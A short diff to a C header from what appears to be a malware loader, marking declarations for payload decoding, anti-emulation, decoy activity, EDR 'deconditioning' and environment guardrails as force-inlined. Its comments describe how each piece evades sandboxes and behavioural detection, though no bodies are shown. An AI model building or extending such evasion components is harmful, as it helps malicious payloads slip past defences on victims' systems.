@@ -36,14 +36,14 @@ FORCE_INLINE void decode_payload(char *dest, int len);
 
 // AntiEmulation: Burns resources or checks environment. 
 // Should return quickly if real, stall/crash if fake.
-void antiemulation(void);
+FORCE_INLINE void antiemulation(void);
 
 // Decoy: Executes benign activity to mislead behavioral analysis.
-void decoy(void);
+FORCE_INLINE void decoy(void);
 
 // Deconditioner: Rehearses the carrier's alloc/write/protect/free pattern
 // with benign data to normalize EDR behavioral baselines.
-void deconditioner(void);
+FORCE_INLINE void deconditioner(void);
 
 // Guardrail: Checks execution environment.
 // Returns 0 if safe to run, non-zero if we should bail.
